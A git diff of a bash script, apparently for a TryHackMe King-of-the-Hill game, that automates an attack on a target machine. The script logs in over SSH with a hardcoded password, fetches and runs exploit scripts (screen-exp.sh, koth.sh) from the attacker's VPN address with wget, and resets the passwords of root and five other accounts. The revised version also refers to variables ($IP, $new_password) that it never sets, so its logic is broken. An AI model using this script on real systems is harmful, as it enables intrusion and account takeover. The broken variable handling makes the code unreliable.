@@ -1,23 +1,40 @@
 #!/bin/bash
 
+missing() {
+  if ! command -v "$1" >/dev/null 2>&1; then
+    echo "Install '$1' before running $0 script."
+    exit 1
+  fi
+}
 
-read -p "Your TryHackMe username: " nick
-read -p "Enter the machine IP address: " ip_address
-read -s -p "Enter the new password: " password
+missing sshpass 
+
+while getopts ":i:u:p:" opt; do
+  case $opt in
+    i) ip_address="$OPTARG" ;;
+    u) username="$OPTARG" ;;
+    p) password="$OPTARG" ;;
+  esac
+done
+
+
+if [ -z "$ip_address" ] || [ -z "$username" ] || [ -z "$password" ]; then
+  echo "Usage: $0 -i 'The machine IP' -u 'Your username on thm' -p 'The new password'"
+  exit 1
+fi
 
 vpn=$(ip a show dev tun0 | awk '/inet / {print $2}' | cut -d'/' -f1)
 
-ssh -o StrictHostKeychecking=no pasta@"$ip_address" << EOF
+sshpass -p pastisdynamic ssh -o StrictHostKeychecking=no pasta@"$IP" << EOF
+    
     wget http://$vpn/screen-exp.sh && chmod +x screen-exp.sh && ./screen-exp.sh
     sleep 3
 
-    cd /boot && wget http://$vpn/koth.sh && chmod +x koth.sh && ./koth.sh "$vpn" "$nick"
-    echo "root:$password" | chpasswd
-    echo "food:$password" | chpasswd
-    echo "tryhackme:$password" | chpasswd
-    echo "ramen:$password" | chpasswd
-    echo "bread:$password" | chpasswd
-    echo "pasta:$password" | chpasswd
-
-
+    cd /boot && wget http://$vpn/koth.sh && chmod +x koth.sh && ./koth.sh "$vpn" "$username"
+    echo "root:$new_password" | chpasswd
+    echo "food:$new_password" | chpasswd
+    echo "tryhackme:$new_password" | chpasswd
+    echo "ramen:$new_password" | chpasswd
+    echo "bread:$new_password" | chpasswd
+    echo "pasta:$new_password" | chpasswd
 EOF
